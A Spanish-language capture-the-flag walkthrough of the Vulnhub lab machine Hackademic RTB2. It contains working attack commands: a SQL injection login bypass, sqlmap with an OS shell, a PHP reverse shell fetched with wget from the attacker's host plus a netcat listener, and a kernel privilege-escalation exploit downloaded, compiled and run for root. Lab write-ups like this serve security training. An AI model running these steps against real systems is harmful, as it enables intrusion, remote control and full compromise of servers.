<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?font=xd&size=50&color=3CF700FF&background=FF000000&width=500&height=80&lines=HACKADEMIC_RTB2"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/hackademic-rtb2,18/

<h1 align="center"><img src="https://user-images.githubusercontent.com/75953873/182723256-9616db47-6dcd-4884-a26f-0bd69b382d29.png"></h1>

</br>

- *Paso 1:* Identificación de la máquina en la red con ArpScan. 
```
arp-scan --interface eth0 -l
```
![2](https://user-images.githubusercontent.com/75953873/182723636-8e6a7d2c-7280-4742-a5b3-17660bdd6a2e.png)

IP host: `192.168.25.131`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.25.131
```
![3](https://user-images.githubusercontent.com/75953873/182724090-b60c5b67-0dd2-4a6c-83d7-01c541c00bef.png)

Puertos abiertos: [80,666]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 80,666 -A 192.168.25.131
```
![4](https://user-images.githubusercontent.com/75953873/182724516-60843d6c-3ed8-4307-8345-7431696978a3.png)

Servidor corriendo: **HTTP Apache**

O.S: Linux (**Ubuntu**)

URL del servidor: `http://192.168.25.131`

![5](https://user-images.githubusercontent.com/75953873/182724778-d685a545-04c9-4e41-8a49-3058067bc121.png)

- *Paso 4:* Bypassear página con inyección SQL manual. 

Username: `' or 1=1--'`

Password: `' or 1=1--'`

![6](https://user-images.githubusercontent.com/75953873/182725260-0ebeb8c5-c0af-465d-b520-69816fb8b37a.png)

![7](https://user-images.githubusercontent.com/75953873/182725313-445bffd4-699b-404c-9304-80a514377bfa.png)

Al inspeccionar el código fuente, la etiqueta `<font>` contiene un texto ofuscado a hexadecimal.

![9](https://user-images.githubusercontent.com/75953873/182725970-78c8a7d8-80ea-4298-906f-7b8e9a898268.png)

```
%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A
```

- *Paso 5:* Decodificar mensaje de forma Online y con BurpSuite. 

**ONLINE:** https://www.online-toolz.com/langs/es/tool-es-text-hex-convertor.html

![10](https://user-images.githubusercontent.com/75953873/182726252-e5756ba4-5cf6-44ce-92a1-76971760b4d8.png)

**BURPSUITE:**

Decoder:
```
[Text] -> Decode as -> URL
[Hex] -> Decode as -> ASCII hex
[Text] -> Decode as -> Plain
```
![11](https://user-images.githubusercontent.com/75953873/182727019-7c7f2896-8299-42f1-ba58-d6e69c1d6545.png)

Decodificar cadena binaria: https://www.traductorbinario.com/
```
0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1 
```

![12](https://user-images.githubusercontent.com/75953873/182727491-9cdcf046-d840-4923-a7fd-1c5d0258a98c.png)

- *Paso 6:* Acceder al puerto 666 golpeado recursivamente los puertos `1001,1101,1011,1001` con Nmap. 
```
nmap -r -p 1001,1101,1011,1001 192.168.25.131
```
![13](https://user-images.githubusercontent.com/75953873/182728017-cd632ee0-4ae2-4f7e-8e8e-f78ee7450ebd.png)

URL con el puerto 666 abierto: `http://192.168.25.131:666`

![14](https://user-images.githubusercontent.com/75953873/182728213-b629fc94-5457-4086-b57d-f5b01b3aeb2a.png)

- *Paso 7:* Encontrar parámetro vulnerable a inyección SQLI. 

Navegando en el sitio web se puede observar que la "Lista de artículos de contenido" presenta una URL crítica.
```
sqlmap --url 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3' --dbs --batch
```
![15](https://user-images.githubusercontent.com/75953873/182728721-92cf4596-2d56-4614-88c3-30419f27d7d7.png)

- *Paso 8:* Subir una shell a la base de datos `joomla`:
```
sqlmap --url 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3' -D joomla --os-shell --batch
```
![16](https://user-images.githubusercontent.com/75953873/182729464-41340377-450f-45ff-94eb-4c9789aab291.png)

Editar la reverse shell PHP, moverla al directorio `/root` y subirla al servidor local:
```
cp /usr/share/webshells/php/php-reverse-shell.php /root
nano php-reverse-shell.php
mv php-reverse-shell.php reverseshell.php
```

**$ip:** La IP local de su máquina.

**$port:** 4444 (opcional).

![18](https://user-images.githubusercontent.com/75953873/182730094-c8c2f93f-b0a6-444f-9f84-b26f4efe6030.png)

![17](https://user-images.githubusercontent.com/75953873/182729943-7059e627-8c01-43bc-b0f6-572664c2773c.png)

Abrir servidor local con Python3:
```python
python3 -m http.server 80
```
![20](https://user-images.githubusercontent.com/75953873/182731305-a8adc335-e819-4e5c-9f1e-c388f900f595.png)

Descargar la reverse shell desde la shell obtenida en la base de datos:
```
wget http://192.168.1.9/reverseshell.php
```
![19](https://user-images.githubusercontent.com/75953873/182731485-6dd80b89-38fe-4aa6-a2c1-de63078be636.png)

- *Paso 9:* Poner a escucha conexiones con Netcat:
```
nc -lvp 4444
``` 
Acceder al sitio donde se subio la reverse shell:

URL: `http://192.168.25.131:666/reverseshell.php`

![21](https://user-images.githubusercontent.com/75953873/182731893-d0f3e803-277c-422d-b78c-fd9f8c22c66d.png)

- *Paso 10:* Identificar versión del kernel y descargar exploit:

![22](https://user-images.githubusercontent.com/75953873/182732251-c05c0ba1-7e2e-4da5-a75c-8676435d3a96.png)

```
searchsploit 2.6.3 | grep "RDS"
searchsploit -m 15285
```
![23](https://user-images.githubusercontent.com/75953873/182733308-febf508c-8e3b-42b7-ba66-9b3eb82b6494.png)

Abrir servidor local con Python3:
```python
python3 -m http.server 80
```

Descargar y compilar exploit en el directorio `/tmp`:
```
cd /tmp
wget http://192.168.1.9/15285.c
gcc 15285.c -o kernel
```
![24](https://user-images.githubusercontent.com/75953873/182735176-1cd40bee-e4d0-4956-bc1e-2e593608b292.png)

Explotar kernel:
```
./kernel
```
![26](https://user-images.githubusercontent.com/75953873/182735618-d1d80e24-f62d-4679-b2fa-1d745dfe8abf.png)

Acceder al directorio `/root` y capturar la flag:
```
cd /root
cat Key.txt
```
![25](https://user-images.githubusercontent.com/75953873/182736331-28feb398-5d2a-4cee-8d54-354df9ba9c9e.png)

Descifrar contenido del fichero con base64 y moverlo al servidor local `/var/www`:
```
base64 -d Key.txt > flag
mv flag /var/www
```
URL: `http://192.168.25.131:666/flag`

![28](https://user-images.githubusercontent.com/75953873/182736188-909c542c-55ad-46ea-962a-517ede01b93d.png)

</br>

Felicitaciones al autor <a href="https://www.vulnhub.com/author/mrpr0n,3/">mr.pr0n</a> por la excelente versión 2.0 de **Hackademic**!
